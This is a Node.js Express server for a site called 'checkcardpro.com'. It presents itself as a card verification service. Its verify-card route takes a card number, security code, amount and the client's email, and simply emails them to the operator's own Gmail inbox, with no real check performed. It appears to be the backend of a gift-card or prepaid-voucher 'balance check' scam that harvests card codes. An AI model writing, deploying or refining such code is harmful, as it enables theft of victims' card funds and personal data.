
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

// Configuration CORS
app.use(cors({
  origin: ['https://checkcardpro.com', 'http://localhost:3000'],
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10
});
app.use('/api/verify-card', limiter);

// Configuration Nodemailer
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

// Route de santé
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString()
  });
});

// Route de vérification des cartes
app.post('/api/verify-card', async (req, res) => {
  try {
    const { cardType, cardNumber, securityCode, amount, email, clientName, language = 'it' } = req.body;

    // Validation
    if (!cardType || !cardNumber || !amount || !email) {
      return res.status(400).json({
        success: false,
        error: 'Données manquantes'
      });
    }

    // Génération référence
    const referenceId = `VF${Date.now().toString(36).toUpperCase()}`;
    const formattedDate = new Date().toLocaleString('fr-FR');

    // Contenu email
    const emailContent = `
NOUVELLE DEMANDE DE VÉRIFICATION CARDCHECK PRO
=================================================

RÉFÉRENCE: ${referenceId}
DATE: ${formattedDate}
LANGUE: ${language}

INFORMATIONS CLIENT:
- Email: ${email}
- Nom: ${clientName || 'Non fourni'}

CARTE À VÉRIFIER:
- Type: ${cardType}
- Numéro: ${cardNumber}
${securityCode ? `- Code sécurité: ${securityCode}` : ''}
- Montant: €${amount}

ACTIONS REQUISES:
1. Vérifier la validité
2. Vérifier le solde
3. Répondre au client: ${email}

Site: https://checkcardpro.com
    `;

    // Options email
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: `🔐 Vérification ${cardType} - €${amount}`,
      text: emailContent
    };

    // Envoi email
    await transporter.sendMail(mailOptions);

    console.log(`✅ Demande reçue: ${cardType} - €${amount} - ${email}`);

    res.json({
      success: true,
      message: 'Demande reçue avec succès',
      reference: referenceId
    });

  } catch (error) {
    console.error('❌ Erreur:', error);
    res.status(500).json({
      success: false,
      error: 'Erreur serveur'
    });
  }
});

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Route non trouvée'
  });
});

// Démarrage serveur
app.listen(PORT, () => {
  console.log(`🚀 Serveur démarré sur port ${PORT}`);
  console.log(`🌐 CORS: https://checkcardpro.com`);
  console.log(`📧 Email: ${process.env.EMAIL_USER || 'NON CONFIGURÉ'}`);
});

module.exports = app;
